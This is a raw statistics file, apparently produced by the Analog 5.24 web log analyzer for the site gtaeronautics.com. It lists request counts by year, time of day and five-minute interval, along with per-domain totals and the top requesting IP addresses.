x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	11	06	01	59
x	FR	2007	12	18	17	05
x	LR	2023	11	05	04	46
x	E7	2023	11	06	01	59
x	SR	1491607
x	S7	9669
x	NC	543354
x	C7	0
x	FL	548342
x	F7	577
x	RR	218
x	R7	0
x	NH	106142
x	H7	424
x	BT	57520368399
x	B7	0
1	Rr	398609	26.723	2023
1	Rr	82334	5.520	2022
1	Rr	98917	6.632	2021
1	Rr	89380	5.992	2020
1	Rr	80088	5.369	2019
1	Rr	68927	4.621	2018
1	Rr	60168	4.034	2017
1	Rr	73316	4.915	2016
1	Rr	80796	5.417	2015
1	Rr	110773	7.426	2014
1	Rr	65173	4.369	2013
1	Rr	60742	4.072	2012
1	Rr	57015	3.822	2011
1	Rr	22139	1.484	2010
1	Rr	69710	4.673	2009
1	Rr	71820	4.815	2008
1	Rr	1700	0.114	2007
1	*BT	R	398609	2023
6	Rr	17234	1.155	03	45
6	Rr	13832	0.927	04	00
6	Rr	13759	0.922	04	15
6	Rr	14269	0.957	04	30
6	Rr	15076	1.011	04	45
6	Rr	12799	0.858	05	00
6	Rr	14320	0.960	05	15
6	Rr	13224	0.887	05	30
6	Rr	13080	0.877	05	45
6	Rr	13542	0.908	06	00
6	Rr	12473	0.836	06	15
6	Rr	13081	0.877	06	30
6	Rr	11757	0.788	06	45
6	Rr	13450	0.902	07	00
6	Rr	13208	0.885	07	15
6	Rr	12850	0.861	07	30
6	Rr	12053	0.808	07	45
6	Rr	11832	0.793	08	00
6	Rr	12544	0.841	08	15
6	Rr	12659	0.849	08	30
6	Rr	11481	0.770	08	45
6	Rr	10843	0.727	09	00
6	Rr	11158	0.748	09	15
6	Rr	12411	0.832	09	30
6	Rr	11150	0.748	09	45
6	Rr	11484	0.770	10	00
6	Rr	12662	0.849	10	15
6	Rr	12796	0.858	10	30
6	Rr	12218	0.819	10	45
6	Rr	14445	0.968	11	00
6	Rr	13355	0.895	11	15
6	Rr	13648	0.915	11	30
6	Rr	11816	0.792	11	45
6	Rr	14170	0.950	12	00
6	Rr	12805	0.858	12	15
6	Rr	12389	0.831	12	30
6	Rr	14145	0.948	12	45
6	Rr	13041	0.874	13	00
6	Rr	15435	1.035	13	15
6	Rr	15140	1.015	13	30
6	Rr	14356	0.962	13	45
6	Rr	16909	1.134	14	00
6	Rr	18701	1.254	14	15
6	Rr	17291	1.159	14	30
6	Rr	17464	1.171	14	45
6	Rr	17895	1.200	15	00
6	Rr	17981	1.205	15	15
6	Rr	19695	1.320	15	30
6	Rr	19311	1.295	15	45
6	Rr	19998	1.341	16	00
6	Rr	19900	1.334	16	15
6	Rr	19051	1.277	16	30
6	Rr	20936	1.404	16	45
6	Rr	21484	1.440	17	00
6	Rr	21303	1.428	17	15
6	Rr	21438	1.437	17	30
6	Rr	19728	1.323	17	45
6	Rr	20998	1.408	18	00
6	Rr	18691	1.253	18	15
6	Rr	20274	1.359	18	30
6	Rr	19547	1.310	18	45
6	Rr	20798	1.394	19	00
6	Rr	19219	1.288	19	15
6	Rr	19436	1.303	19	30
6	Rr	19896	1.334	19	45
6	Rr	18899	1.267	20	00
6	Rr	19541	1.310	20	15
6	Rr	16901	1.133	20	30
6	Rr	19828	1.329	20	45
6	Rr	17858	1.197	21	00
6	Rr	18212	1.221	21	15
6	Rr	16426	1.101	21	30
6	Rr	18681	1.252	21	45
6	Rr	15639	1.048	22	00
6	Rr	15904	1.066	22	15
6	Rr	16139	1.082	22	30
6	Rr	16615	1.114	22	45
6	Rr	16292	1.092	23	00
6	Rr	16867	1.131	23	15
6	Rr	14155	0.949	23	30
6	Rr	14730	0.988	23	45
5	Rr	1	0.000	2023	11	05	04	45
5	Rr	0	0.000	2023	11	05	04	40
5	Rr	0	0.000	2023	11	05	04	35
5	Rr	0	0.000	2023	11	05	04	30
5	Rr	1	0.000	2023	11	05	04	25
5	Rr	1	0.000	2023	11	05	04	20
5	Rr	0	0.000	2023	11	05	04	15
5	Rr	1	0.000	2023	11	05	04	10
5	Rr	30	0.002	2023	11	05	04	05
5	Rr	0	0.000	2023	11	05	04	00
5	Rr	0	0.000	2023	11	05	03	55
5	Rr	1	0.000	2023	11	05	03	50
5	Rr	1	0.000	2023	11	05	03	45
5	Rr	9	0.001	2023	11	05	03	40
5	Rr	3	0.000	2023	11	05	03	35
5	Rr	1	0.000	2023	11	05	03	30
5	Rr	0	0.000	2023	11	05	03	25
5	Rr	1	0.000	2023	11	05	03	20
5	Rr	2	0.000	2023	11	05	03	15
5	Rr	1	0.000	2023	11	05	03	10
5	Rr	1	0.000	2023	11	05	03	05
5	Rr	2	0.000	2023	11	05	03	00
5	Rr	0	0.000	2023	11	05	02	55
5	Rr	2	0.000	2023	11	05	02	50
5	Rr	1	0.000	2023	11	05	02	45
5	Rr	0	0.000	2023	11	05	02	40
5	Rr	0	0.000	2023	11	05	02	35
5	Rr	0	0.000	2023	11	05	02	30
5	Rr	0	0.000	2023	11	05	02	25
5	Rr	0	0.000	2023	11	05	02	20
5	Rr	0	0.000	2023	11	05	02	15
5	Rr	1	0.000	2023	11	05	02	10
5	Rr	0	0.000	2023	11	05	02	05
5	Rr	0	0.000	2023	11	05	02	00
5	Rr	0	0.000	2023	11	05	01	55
5	Rr	0	0.000	2023	11	05	01	50
5	Rr	1	0.000	2023	11	05	01	45
5	Rr	1	0.000	2023	11	05	01	40
5	Rr	0	0.000	2023	11	05	01	35
5	Rr	0	0.000	2023	11	05	01	30
5	Rr	1	0.000	2023	11	05	01	25
5	Rr	0	0.000	2023	11	05	01	20
5	Rr	1	0.000	2023	11	05	01	15
5	Rr	0	0.000	2023	11	05	01	10
5	Rr	1	0.000	2023	11	05	01	05
5	Rr	0	0.000	2023	11	05	01	00
5	Rr	1	0.000	2023	11	05	00	55
5	Rr	0	0.000	2023	11	05	00	50
5	Rr	1	0.000	2023	11	05	00	45
5	Rr	1	0.000	2023	11	05	00	40
5	Rr	0	0.000	2023	11	05	00	35
5	Rr	1	0.000	2023	11	05	00	30
5	Rr	1	0.000	2023	11	05	00	25
5	Rr	0	0.000	2023	11	05	00	20
5	Rr	1	0.000	2023	11	05	00	15
5	Rr	1	0.000	2023	11	05	00	10
5	Rr	1	0.000	2023	11	05	00	05
5	Rr	1	0.000	2023	11	05	00	00
5	Rr	0	0.000	2023	11	04	23	55
5	Rr	0	0.000	2023	11	04	23	50
5	Rr	0	0.000	2023	11	04	23	45
5	Rr	2	0.000	2023	11	04	23	40
5	Rr	1	0.000	2023	11	04	23	35
5	Rr	0	0.000	2023	11	04	23	30
5	Rr	0	0.000	2023	11	04	23	25
5	Rr	4	0.000	2023	11	04	23	20
5	Rr	0	0.000	2023	11	04	23	15
5	Rr	2	0.000	2023	11	04	23	10
5	Rr	1	0.000	2023	11	04	23	05
5	Rr	1	0.000	2023	11	04	23	00
5	Rr	1	0.000	2023	11	04	22	55
5	Rr	0	0.000	2023	11	04	22	50
5	Rr	1	0.000	2023	11	04	22	45
5	Rr	0	0.000	2023	11	04	22	40
5	Rr	1	0.000	2023	11	04	22	35
5	Rr	0	0.000	2023	11	04	22	30
5	Rr	2	0.000	2023	11	04	22	25
5	Rr	1	0.000	2023	11	04	22	20
5	Rr	2	0.000	2023	11	04	22	15
5	Rr	0	0.000	2023	11	04	22	10
5	Rr	0	0.000	2023	11	04	22	05
5	Rr	0	0.000	2023	11	04	22	00
5	Rr	6	0.000	2023	11	04	21	55
5	Rr	2	0.000	2023	11	04	21	50
5	Rr	1	0.000	2023	11	04	21	45
5	Rr	4	0.000	2023	11	04	21	40
5	Rr	0	0.000	2023	11	04	21	35
5	Rr	2	0.000	2023	11	04	21	30
5	Rr	0	0.000	2023	11	04	21	25
5	Rr	2	0.000	2023	11	04	21	20
5	Rr	1	0.000	2023	11	04	21	15
5	Rr	1	0.000	2023	11	04	21	10
5	Rr	0	0.000	2023	11	04	21	05
5	Rr	1	0.000	2023	11	04	21	00
5	Rr	1	0.000	2023	11	04	20	55
5	Rr	29	0.002	2023	11	04	20	50
5	Rr	1	0.000	2023	11	04	20	45
5	Rr	0	0.000	2023	11	04	20	40
5	Rr	0	0.000	2023	11	04	20	35
5	Rr	0	0.000	2023	11	04	20	30
5	Rr	1	0.000	2023	11	04	20	25
5	Rr	1	0.000	2023	11	04	20	20
5	Rr	2	0.000	2023	11	04	20	15
5	Rr	0	0.000	2023	11	04	20	10
5	Rr	2	0.000	2023	11	04	20	05
5	Rr	0	0.000	2023	11	04	20	00
5	Rr	3	0.000	2023	11	04	19	55
5	Rr	1	0.000	2023	11	04	19	50
5	Rr	1	0.000	2023	11	04	19	45
5	Rr	1	0.000	2023	11	04	19	40
5	Rr	0	0.000	2023	11	04	19	35
5	Rr	2	0.000	2023	11	04	19	30
5	Rr	3	0.000	2023	11	04	19	25
5	Rr	1	0.000	2023	11	04	19	20
5	Rr	0	0.000	2023	11	04	19	15
5	Rr	2	0.000	2023	11	04	19	10
5	Rr	1	0.000	2023	11	04	19	05
5	Rr	0	0.000	2023	11	04	19	00
5	Rr	2	0.000	2023	11	04	18	55
5	Rr	0	0.000	2023	11	04	18	50
5	Rr	1	0.000	2023	11	04	18	45
5	Rr	0	0.000	2023	11	04	18	40
5	Rr	0	0.000	2023	11	04	18	35
5	Rr	2	0.000	2023	11	04	18	30
5	Rr	0	0.000	2023	11	04	18	25
5	Rr	2	0.000	2023	11	04	18	20
5	Rr	0	0.000	2023	11	04	18	15
5	Rr	0	0.000	2023	11	04	18	10
5	Rr	0	0.000	2023	11	04	18	05
5	Rr	3	0.000	2023	11	04	18	00
5	Rr	2	0.000	2023	11	04	17	55
5	Rr	1	0.000	2023	11	04	17	50
5	Rr	0	0.000	2023	11	04	17	45
5	Rr	1	0.000	2023	11	04	17	40
5	Rr	1	0.000	2023	11	04	17	35
5	Rr	1	0.000	2023	11	04	17	30
5	Rr	1	0.000	2023	11	04	17	25
5	Rr	8	0.001	2023	11	04	17	20
5	Rr	0	0.000	2023	11	04	17	15
5	Rr	1	0.000	2023	11	04	17	10
5	Rr	0	0.000	2023	11	04	17	05
5	Rr	1	0.000	2023	11	04	17	00
5	Rr	2	0.000	2023	11	04	16	55
5	Rr	0	0.000	2023	11	04	16	50
5	Rr	1	0.000	2023	11	04	16	45
5	Rr	2	0.000	2023	11	04	16	40
5	Rr	0	0.000	2023	11	04	16	35
5	Rr	0	0.000	2023	11	04	16	30
5	Rr	1	0.000	2023	11	04	16	25
5	Rr	2	0.000	2023	11	04	16	20
5	Rr	2	0.000	2023	11	04	16	15
5	Rr	1	0.000	2023	11	04	16	10
5	Rr	0	0.000	2023	11	04	16	05
5	Rr	1	0.000	2023	11	04	16	00
5	Rr	0	0.000	2023	11	04	15	55
5	Rr	0	0.000	2023	11	04	15	50
5	Rr	3	0.000	2023	11	04	15	45
5	Rr	1	0.000	2023	11	04	15	40
5	Rr	0	0.000	2023	11	04	15	35
5	Rr	1	0.000	2023	11	04	15	30
5	Rr	1	0.000	2023	11	04	15	25
5	Rr	1	0.000	2023	11	04	15	20
5	Rr	1	0.000	2023	11	04	15	15
5	Rr	1	0.000	2023	11	04	15	10
5	Rr	1	0.000	2023	11	04	15	05
5	Rr	1	0.000	2023	11	04	15	00
5	Rr	1	0.000	2023	11	04	14	55
5	Rr	2	0.000	2023	11	04	14	50
5	Rr	0	0.000	2023	11	04	14	45
5	Rr	1	0.000	2023	11	04	14	40
5	Rr	10	0.001	2023	11	04	14	35
5	Rr	1	0.000	2023	11	04	14	30
5	Rr	1	0.000	2023	11	04	14	25
5	Rr	1	0.000	2023	11	04	14	20
5	Rr	8	0.001	2023	11	04	14	15
5	Rr	0	0.000	2023	11	04	14	10
5	Rr	0	0.000	2023	11	04	14	05
5	Rr	1	0.000	2023	11	04	14	00
5	Rr	0	0.000	2023	11	04	13	55
5	Rr	0	0.000	2023	11	04	13	50
5	Rr	0	0.000	2023	11	04	13	45
5	Rr	0	0.000	2023	11	04	13	40
5	Rr	1	0.000	2023	11	04	13	35
5	Rr	0	0.000	2023	11	04	13	30
5	Rr	0	0.000	2023	11	04	13	25
5	Rr	1	0.000	2023	11	04	13	20
5	Rr	0	0.000	2023	11	04	13	15
5	Rr	1	0.000	2023	11	04	13	10
5	Rr	0	0.000	2023	11	04	13	05
5	Rr	0	0.000	2023	11	04	13	00
5	Rr	4	0.000	2023	11	04	12	55
5	Rr	0	0.000	2023	11	04	12	50
5	Rr	1	0.000	2023	11	04	12	45
5	Rr	0	0.000	2023	11	04	12	40
5	Rr	0	0.000	2023	11	04	12	35
5	Rr	0	0.000	2023	11	04	12	30
5	Rr	0	0.000	2023	11	04	12	25
5	Rr	0	0.000	2023	11	04	12	20
5	Rr	1	0.000	2023	11	04	12	15
5	Rr	0	0.000	2023	11	04	12	10
5	Rr	0	0.000	2023	11	04	12	05
5	Rr	0	0.000	2023	11	04	12	00
5	Rr	0	0.000	2023	11	04	11	55
5	Rr	20	0.001	2023	11	04	11	50
5	Rr	1	0.000	2023	11	04	11	45
5	Rr	0	0.000	2023	11	04	11	40
5	Rr	1	0.000	2023	11	04	11	35
5	Rr	0	0.000	2023	11	04	11	30
5	Rr	4	0.000	2023	11	04	11	25
5	Rr	1	0.000	2023	11	04	11	20
5	Rr	0	0.000	2023	11	04	11	15
5	Rr	0	0.000	2023	11	04	11	10
5	Rr	1	0.000	2023	11	04	11	05
5	Rr	0	0.000	2023	11	04	11	00
5	Rr	2	0.000	2023	11	04	10	55
5	Rr	2	0.000	2023	11	04	10	50
5	Rr	0	0.000	2023	11	04	10	45
5	Rr	2	0.000	2023	11	04	10	40
5	Rr	4	0.000	2023	11	04	10	35
5	Rr	1	0.000	2023	11	04	10	30
5	Rr	0	0.000	2023	11	04	10	25
5	Rr	0	0.000	2023	11	04	10	20
5	Rr	0	0.000	2023	11	04	10	15
5	Rr	0	0.000	2023	11	04	10	10
5	Rr	1	0.000	2023	11	04	10	05
5	Rr	1	0.000	2023	11	04	10	00
5	Rr	0	0.000	2023	11	04	09	55
5	Rr	1	0.000	2023	11	04	09	50
5	Rr	0	0.000	2023	11	04	09	45
5	Rr	1	0.000	2023	11	04	09	40
5	Rr	0	0.000	2023	11	04	09	35
5	Rr	2	0.000	2023	11	04	09	30
5	Rr	0	0.000	2023	11	04	09	25
5	Rr	1	0.000	2023	11	04	09	20
5	Rr	1	0.000	2023	11	04	09	15
5	Rr	0	0.000	2023	11	04	09	10
5	Rr	7	0.000	2023	11	04	09	05
5	Rr	0	0.000	2023	11	04	09	00
5	Rr	1	0.000	2023	11	04	08	55
5	Rr	1	0.000	2023	11	04	08	50
5	Rr	0	0.000	2023	11	04	08	45
5	Rr	3	0.000	2023	11	04	08	40
5	Rr	1	0.000	2023	11	04	08	35
5	Rr	0	0.000	2023	11	04	08	30
5	Rr	0	0.000	2023	11	04	08	25
5	Rr	0	0.000	2023	11	04	08	20
5	Rr	0	0.000	2023	11	04	08	15
5	Rr	0	0.000	2023	11	04	08	10
5	Rr	0	0.000	2023	11	04	08	05
5	Rr	2	0.000	2023	11	04	08	00
5	Rr	0	0.000	2023	11	04	07	55
5	Rr	0	0.000	2023	11	04	07	50
5	Rr	0	0.000	2023	11	04	07	45
5	Rr	0	0.000	2023	11	04	07	40
5	Rr	0	0.000	2023	11	04	07	35
5	Rr	0	0.000	2023	11	04	07	30
5	Rr	1	0.000	2023	11	04	07	25
5	Rr	1	0.000	2023	11	04	07	20
5	Rr	2	0.000	2023	11	04	07	15
5	Rr	0	0.000	2023	11	04	07	10
5	Rr	0	0.000	2023	11	04	07	05
5	Rr	0	0.000	2023	11	04	07	00
5	Rr	4	0.000	2023	11	04	06	55
5	Rr	0	0.000	2023	11	04	06	50
5	Rr	0	0.000	2023	11	04	06	45
5	Rr	0	0.000	2023	11	04	06	40
5	Rr	0	0.000	2023	11	04	06	35
5	Rr	1	0.000	2023	11	04	06	30
5	Rr	1	0.000	2023	11	04	06	25
5	Rr	1	0.000	2023	11	04	06	20
5	Rr	4	0.000	2023	11	04	06	15
5	Rr	0	0.000	2023	11	04	06	10
5	Rr	0	0.000	2023	11	04	06	05
5	Rr	0	0.000	2023	11	04	06	00
5	Rr	0	0.000	2023	11	04	05	55
5	Rr	0	0.000	2023	11	04	05	50
5	Rr	0	0.000	2023	11	04	05	45
5	Rr	0	0.000	2023	11	04	05	40
5	Rr	0	0.000	2023	11	04	05	35
5	Rr	0	0.000	2023	11	04	05	30
5	Rr	0	0.000	2023	11	04	05	25
5	Rr	0	0.000	2023	11	04	05	20
5	Rr	1	0.000	2023	11	04	05	15
5	Rr	0	0.000	2023	11	04	05	10
5	Rr	0	0.000	2023	11	04	05	05
5	Rr	0	0.000	2023	11	04	05	00
5	Rr	0	0.000	2023	11	04	04	55
5	Rr	0	0.000	2023	11	04	04	50
5	*BT	R	945	2023	05	08	18	00
7	Rr	4400	0.295	00	00
7	Rr	4477	0.300	00	05
7	Rr	4812	0.323	00	10
7	Rr	3685	0.247	00	15
7	Rr	4718	0.316	00	20
7	Rr	5497	0.369	00	25
7	Rr	4656	0.312	00	30
7	Rr	5111	0.343	00	35
7	Rr	4796	0.322	00	40
7	Rr	4929	0.330	00	45
7	Rr	4995	0.335	00	50
7	Rr	4843	0.325	00	55
7	Rr	4409	0.296	01	00
7	Rr	4551	0.305	01	05
7	Rr	4166	0.279	01	10
7	Rr	4971	0.333	01	15
7	Rr	5346	0.358	01	20
7	Rr	4395	0.295	01	25
7	Rr	4376	0.293	01	30
7	Rr	4365	0.293	01	35
7	Rr	5133	0.344	01	40
7	Rr	4553	0.305	01	45
7	Rr	5217	0.350	01	50
7	Rr	5018	0.336	01	55
7	Rr	4364	0.293	02	00
7	Rr	4296	0.288	02	05
7	Rr	4396	0.295	02	10
7	Rr	5149	0.345	02	15
7	Rr	4336	0.291	02	20
7	Rr	4989	0.334	02	25
7	Rr	5059	0.339	02	30
7	Rr	5059	0.339	02	35
7	Rr	4875	0.327	02	40
7	Rr	4455	0.299	02	45
7	Rr	4633	0.311	02	50
7	Rr	5299	0.355	02	55
7	Rr	5265	0.353	03	00
7	Rr	4653	0.312	03	05
7	Rr	4631	0.310	03	10
7	Rr	4552	0.305	03	15
7	Rr	4659	0.312	03	20
7	Rr	4702	0.315	03	25
7	Rr	4753	0.319	03	30
7	Rr	4781	0.321	03	35
7	Rr	4661	0.312	03	40
7	Rr	5602	0.376	03	45
7	Rr	6490	0.435	03	50
7	Rr	5142	0.345	03	55
7	Rr	4656	0.312	04	00
7	Rr	4405	0.295	04	05
7	Rr	4771	0.320	04	10
7	Rr	4909	0.329	04	15
7	Rr	4360	0.292	04	20
7	Rr	4490	0.301	04	25
7	Rr	4552	0.305	04	30
7	Rr	4627	0.310	04	35
7	Rr	5090	0.341	04	40
7	Rr	5297	0.355	04	45
7	Rr	4856	0.326	04	50
7	Rr	4923	0.330	04	55
7	Rr	4535	0.304	05	00
7	Rr	4195	0.281	05	05
7	Rr	4069	0.273	05	10
7	Rr	5063	0.339	05	15
7	Rr	4837	0.324	05	20
7	Rr	4420	0.296	05	25
7	Rr	4593	0.308	05	30
7	Rr	4607	0.309	05	35
7	Rr	4024	0.270	05	40
7	Rr	4226	0.283	05	45
7	Rr	4214	0.283	05	50
7	Rr	4640	0.311	05	55
7	Rr	4308	0.289	06	00
7	Rr	4883	0.327	06	05
7	Rr	4351	0.292	06	10
7	Rr	4461	0.299	06	15
7	Rr	3810	0.255	06	20
7	Rr	4202	0.282	06	25
7	Rr	4215	0.283	06	30
7	Rr	4513	0.303	06	35
7	Rr	4353	0.292	06	40
7	Rr	4105	0.275	06	45
7	Rr	3997	0.268	06	50
7	Rr	3655	0.245	06	55
7	Rr	5353	0.359	07	00
7	Rr	4170	0.280	07	05
7	Rr	3927	0.263	07	10
7	Rr	3932	0.264	07	15
7	Rr	4681	0.314	07	20
7	Rr	4595	0.308	07	25
7	Rr	4291	0.288	07	30
7	Rr	4474	0.300	07	35
7	Rr	4085	0.274	07	40
7	Rr	4579	0.307	07	45
7	Rr	3682	0.247	07	50
7	Rr	3792	0.254	07	55
7	Rr	4211	0.282	08	00
7	Rr	3759	0.252	08	05
7	Rr	3862	0.259	08	10
7	Rr	4127	0.277	08	15
7	Rr	4081	0.274	08	20
7	Rr	4336	0.291	08	25
7	Rr	4084	0.274	08	30
7	Rr	4052	0.272	08	35
7	Rr	4523	0.303	08	40
7	Rr	4260	0.286	08	45
7	Rr	3673	0.246	08	50
7	Rr	3548	0.238	08	55
7	Rr	3760	0.252	09	00
7	Rr	3662	0.246	09	05
7	Rr	3421	0.229	09	10
7	Rr	3144	0.211	09	15
7	Rr	3820	0.256	09	20
7	Rr	4194	0.281	09	25
7	Rr	3805	0.255	09	30
7	Rr	3821	0.256	09	35
7	Rr	4785	0.321	09	40
7	Rr	3676	0.246	09	45
7	Rr	3638	0.244	09	50
7	Rr	3836	0.257	09	55
7	Rr	3762	0.252	10	00
7	Rr	3637	0.244	10	05
7	Rr	4085	0.274	10	10
7	Rr	3712	0.249	10	15
7	Rr	4207	0.282	10	20
7	Rr	4743	0.318	10	25
7	Rr	4413	0.296	10	30
7	Rr	4190	0.281	10	35
7	Rr	4193	0.281	10	40
7	Rr	3765	0.252	10	45
7	Rr	4344	0.291	10	50
7	Rr	4109	0.275	10	55
7	Rr	5694	0.382	11	00
7	Rr	4402	0.295	11	05
7	Rr	4349	0.292	11	10
7	Rr	4163	0.279	11	15
7	Rr	3963	0.266	11	20
7	Rr	5229	0.351	11	25
7	Rr	5719	0.383	11	30
7	Rr	3750	0.251	11	35
7	Rr	4179	0.280	11	40
7	Rr	3984	0.267	11	45
7	Rr	3930	0.263	11	50
7	Rr	3902	0.262	11	55
7	Rr	4774	0.320	12	00
7	Rr	4649	0.312	12	05
7	Rr	4747	0.318	12	10
7	Rr	4105	0.275	12	15
7	Rr	4371	0.293	12	20
7	Rr	4329	0.290	12	25
7	Rr	4125	0.277	12	30
7	Rr	4157	0.279	12	35
7	Rr	4107	0.275	12	40
7	Rr	4544	0.305	12	45
7	Rr	4870	0.326	12	50
7	Rr	4731	0.317	12	55
7	Rr	4328	0.290	13	00
7	Rr	4177	0.280	13	05
7	Rr	4536	0.304	13	10
7	Rr	5046	0.338	13	15
7	Rr	5145	0.345	13	20
7	Rr	5244	0.352	13	25
7	Rr	4542	0.305	13	30
7	Rr	5108	0.342	13	35
7	Rr	5490	0.368	13	40
7	Rr	3967	0.266	13	45
7	Rr	5407	0.362	13	50
7	Rr	4982	0.334	13	55
7	Rr	5368	0.360	14	00
7	Rr	6079	0.408	14	05
7	Rr	5462	0.366	14	10
7	Rr	6622	0.444	14	15
7	Rr	6501	0.436	14	20
7	Rr	5578	0.374	14	25
7	Rr	5958	0.399	14	30
7	Rr	5668	0.380	14	35
7	Rr	5665	0.380	14	40
7	Rr	5628	0.377	14	45
7	Rr	5018	0.336	14	50
7	Rr	6818	0.457	14	55
7	Rr	6678	0.448	15	00
7	Rr	5318	0.357	15	05
7	Rr	5899	0.395	15	10
7	Rr	5403	0.362	15	15
7	Rr	6389	0.428	15	20
7	Rr	6189	0.415	15	25
7	Rr	6342	0.425	15	30
7	Rr	5830	0.391	15	35
7	Rr	7523	0.504	15	40
7	Rr	5674	0.380	15	45
7	Rr	6670	0.447	15	50
7	Rr	6967	0.467	15	55
7	Rr	5933	0.398	16	00
7	Rr	7038	0.472	16	05
7	Rr	7027	0.471	16	10
7	Rr	7376	0.495	16	15
7	Rr	6654	0.446	16	20
7	Rr	5870	0.394	16	25
7	Rr	5749	0.385	16	30
7	Rr	6455	0.433	16	35
7	Rr	6847	0.459	16	40
7	Rr	7002	0.469	16	45
7	Rr	7494	0.502	16	50
7	Rr	6440	0.432	16	55
7	Rr	7254	0.486	17	00
7	Rr	7228	0.485	17	05
7	Rr	7002	0.469	17	10
7	Rr	6545	0.439	17	15
7	Rr	7627	0.511	17	20
7	Rr	7131	0.478	17	25
7	Rr	7590	0.509	17	30
7	Rr	6872	0.461	17	35
7	Rr	6976	0.468	17	40
7	Rr	6706	0.450	17	45
7	Rr	6545	0.439	17	50
7	Rr	6477	0.434	17	55
7	Rr	7686	0.515	18	00
7	Rr	6240	0.418	18	05
7	Rr	7072	0.474	18	10
7	Rr	6469	0.434	18	15
7	Rr	6137	0.411	18	20
7	Rr	6085	0.408	18	25
7	Rr	7078	0.475	18	30
7	Rr	6160	0.413	18	35
7	Rr	7036	0.472	18	40
7	Rr	6004	0.403	18	45
7	Rr	7217	0.484	18	50
7	Rr	6326	0.424	18	55
7	Rr	7313	0.490	19	00
7	Rr	6887	0.462	19	05
7	Rr	6598	0.442	19	10
7	Rr	6291	0.422	19	15
7	Rr	6403	0.429	19	20
7	Rr	6525	0.437	19	25
7	Rr	6233	0.418	19	30
7	Rr	6811	0.457	19	35
7	Rr	6392	0.429	19	40
7	Rr	6432	0.431	19	45
7	Rr	6639	0.445	19	50
7	Rr	6825	0.458	19	55
7	Rr	6661	0.447	20	00
7	Rr	6010	0.403	20	05
7	Rr	6228	0.418	20	10
7	Rr	6288	0.422	20	15
7	Rr	7256	0.486	20	20
7	Rr	5997	0.402	20	25
7	Rr	5737	0.385	20	30
7	Rr	5718	0.383	20	35
7	Rr	5446	0.365	20	40
7	Rr	7082	0.475	20	45
7	Rr	6389	0.428	20	50
7	Rr	6357	0.426	20	55
7	Rr	6445	0.432	21	00
7	Rr	5574	0.374	21	05
7	Rr	5839	0.391	21	10
7	Rr	6168	0.414	21	15
7	Rr	5559	0.373	21	20
7	Rr	6485	0.435	21	25
7	Rr	5043	0.338	21	30
7	Rr	6028	0.404	21	35
7	Rr	5355	0.359	21	40
7	Rr	7314	0.490	21	45
7	Rr	6262	0.420	21	50
7	Rr	5105	0.342	21	55
7	Rr	4987	0.334	22	00
7	Rr	5304	0.356	22	05
7	Rr	5348	0.359	22	10
7	Rr	5264	0.353	22	15
7	Rr	5310	0.356	22	20
7	Rr	5330	0.357	22	25
7	Rr	5357	0.359	22	30
7	Rr	5511	0.369	22	35
7	Rr	5271	0.353	22	40
7	Rr	6252	0.419	22	45
7	Rr	5444	0.365	22	50
7	Rr	4919	0.330	22	55
7	Rr	5702	0.382	23	00
7	Rr	5364	0.360	23	05
7	Rr	5226	0.350	23	10
7	Rr	5795	0.389	23	15
7	Rr	6143	0.412	23	20
7	Rr	4929	0.330	23	25
7	Rr	4399	0.295	23	30
7	Rr	4858	0.326	23	35
7	Rr	4898	0.328	23	40
7	Rr	4534	0.304	23	45
7	Rr	5086	0.341	23	50
7	Rr	5110	0.343	23	55
o	*f	0R	r
o	lRQ	1	1491607	32459890	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	61763	2.566	66.249
Z	lRb	1	57996	3.582	98
Z	lRb	1	48682	2.524	51
Z	lRb	1	42624	1.401	69
Z	lRb	1	41329	2.025	35
Z	lRb	1	39271	1.794	34
Z	lRb	1	29401	2.897	54
Z	lRb	1	28419	0.506	49
Z	lRb	1	25920	0.641	46
Z	lRb	1	24960	2.469	157.55
Z	lRb	1	24443	0.945	123
Z	lRb	1	23597	2.331	40
Z	lRb	1	22815	2.596	70
Z	lRb	1	20470	1.924	207.46
Z	lRb	1	19715	1.160	76
Z	lRb	1	16334	1.539	72
Z	lRb	1	15378	0.895	75
Z	lRb	1	15149	1.170	104
Z	lRb	1	14684	1.032	52
Z	lRb	1	14047	1.201	5
Z	lRb	1	904610	64.801	[not listed: 9102]
S	*f	-50P	r
S	Rb	4702	0.294	14.33.246.211
S	Rb	3866	0.592	192.234.235.103
S	Rb	3248	0.184	192.99.15.146
S	Rb	2800	0.027	162.55.85.223
S	Rb	2542	0.020	49.7.20.111
S	Rb	2489	0.009	49.7.20.105
S	Rb	2341	0.102	100.43.83.148
